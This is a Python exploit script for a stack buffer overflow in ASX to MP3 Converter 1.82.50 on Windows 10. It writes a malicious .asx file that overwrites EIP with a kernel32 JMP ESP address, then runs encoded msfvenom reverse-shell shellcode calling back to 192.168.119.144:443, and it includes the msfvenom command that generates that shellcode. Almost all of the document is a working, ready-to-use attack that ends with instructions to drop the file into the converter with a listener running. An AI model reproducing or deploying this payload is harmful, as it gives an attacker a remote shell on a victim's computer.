# ASX to MP3 Converter 1.82.50 Stack Overflow
# Author: dead1
# Vendor Homepage: http://mini-stream.net
# Version: 1.82.50
# local priv escalation through stack overflow
# Tested on: Windows 10
import struct

## filename to create
filename = "exploit.asx"

## bad chars: \x00\x01\x09\x0a\x1a
## !mona jmp -r ESP 0x1000986D - BAD CHAR - Must find supporting .dll
## 773452CB Kernel32.dll

print "[*] Dead1 - Building Exploit."

dummy = "A" * 241
EIP   = struct.pack('<I', 0x773452CB) # kernel32.dll
FFFF  = "\xFF\xFF\xFF\xFF"
NOP   = "\x90" * 8

## msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.144 LPORT=443 EXITFUNC=thread -f c -v Shell -e x86/shikata_ga_nai -b "\x00\x01\x09\x0a\x1a"
Shell = ("\xdb\xd1\xbf\xa4\x3f\x79\xc4\xd9\x74\x24\xf4\x5b\x2b\xc9\xb1"
"\x52\x31\x7b\x17\x83\xeb\xfc\x03\xdf\x2c\x9b\x31\xe3\xbb\xd9"
"\xba\x1b\x3c\xbe\x33\xfe\x0d\xfe\x20\x8b\x3e\xce\x23\xd9\xb2"
"\xa5\x66\xc9\x41\xcb\xae\xfe\xe2\x66\x89\x31\xf2\xdb\xe9\x50"
"\x70\x26\x3e\xb2\x49\xe9\x33\xb3\x8e\x14\xb9\xe1\x47\x52\x6c"
"\x15\xe3\x2e\xad\x9e\xbf\xbf\xb5\x43\x77\xc1\x94\xd2\x03\x98"
"\x36\xd5\xc0\x90\x7e\xcd\x05\x9c\xc9\x66\xfd\x6a\xc8\xae\xcf"
"\x93\x67\x8f\xff\x61\x79\xc8\x38\x9a\x0c\x20\x3b\x27\x17\xf7"
"\x41\xf3\x92\xe3\xe2\x70\x04\xcf\x13\x54\xd3\x84\x18\x11\x97"
"\xc2\x3c\xa4\x74\x79\x38\x2d\x7b\xad\xc8\x75\x58\x69\x90\x2e"
"\xc1\x28\x7c\x80\xfe\x2a\xdf\x7d\x5b\x21\xf2\x6a\xd6\x68\x9b"
"\x5f\xdb\x92\x5b\xc8\x6c\xe1\x69\x57\xc7\x6d\xc2\x10\xc1\x6a"
"\x25\x0b\xb5\xe4\xd8\xb4\xc6\x2d\x1f\xe0\x96\x45\xb6\x89\x7c"
"\x95\x37\x5c\xd2\xc5\x97\x0f\x93\xb5\x57\xe0\x7b\xdf\x57\xdf"
"\x9c\xe0\xbd\x48\x36\x1b\x56\xb7\x6f\x54\x36\x5f\x72\x9a\x37"
"\x1b\xfb\x7c\x5d\x4b\xaa\xd7\xca\xf2\xf7\xa3\x6b\xfa\x2d\xce"
"\xac\x70\xc2\x2f\x62\x71\xaf\x23\x13\x71\xfa\x19\xb2\x8e\xd0"
"\x35\x58\x1c\xbf\xc5\x17\x3d\x68\x92\x70\xf3\x61\x76\x6d\xaa"
"\xdb\x64\x6c\x2a\x23\x2c\xab\x8f\xaa\xad\x3e\xab\x88\xbd\x86"
"\x34\x95\xe9\x56\x63\x43\x47\x11\xdd\x25\x31\xcb\xb2\xef\xd5"
"\x8a\xf8\x2f\xa3\x92\xd4\xd9\x4b\x22\x81\x9f\x74\x8b\x45\x28"
"\x0d\xf1\xf5\xd7\xc4\xb1\x16\x3a\xcc\xcf\xbe\xe3\x85\x6d\xa3"
"\x13\x70\xb1\xda\x97\x70\x4a\x19\x87\xf1\x4f\x65\x0f\xea\x3d"
"\xf6\xfa\x0c\x91\xf7\x2e")

exploit = dummy + EIP + FFFF + NOP + Shell
f = open(filename,"wb")
f.write(exploit)
f.close()
print "[*] Exploit Created. Drop File Into Converter with a Listener Ready. \nFilename: "+ filename
